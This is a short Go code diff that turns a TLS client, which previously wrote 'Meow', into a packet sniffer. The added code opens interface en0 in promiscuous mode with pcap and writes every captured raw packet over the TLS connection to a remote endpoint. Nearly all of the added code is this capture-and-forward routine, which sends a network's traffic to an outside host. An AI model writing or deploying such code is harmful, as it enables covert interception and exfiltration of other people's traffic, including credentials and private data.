@@ -4,7 +4,16 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"log"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/pcap"
 )
+
+func handlepackets(p *gopacket.PacketSource, conn *tls.Conn) {
+	for packet := range p.Packets() {
+		conn.Write([]byte(packet.Data()))
+	}
+}
 
 func main() {
 
@@ -38,6 +47,19 @@ X+DareRG2QiUII3RtVhESZtVGQeiy8rqNFr/jYGNa/DUYQ==
 	if err != nil {
 		log.Fatal(err)
 	}
-	conn.Write([]byte("Meow\n"))
-	conn.CloseWrite()
+
+	// Set up listener on interface.
+	// Device arg input.
+	//if len(os.Args) != 2 {
+	//	fmt.Println("Invalid Interface Reference!")
+	//	return
+	// }
+	iface := "en0"
+	// Device Handler
+	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
+	if err != nil {
+		panic(err)
+	}
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+	handlepackets(packetSource, conn)
 }
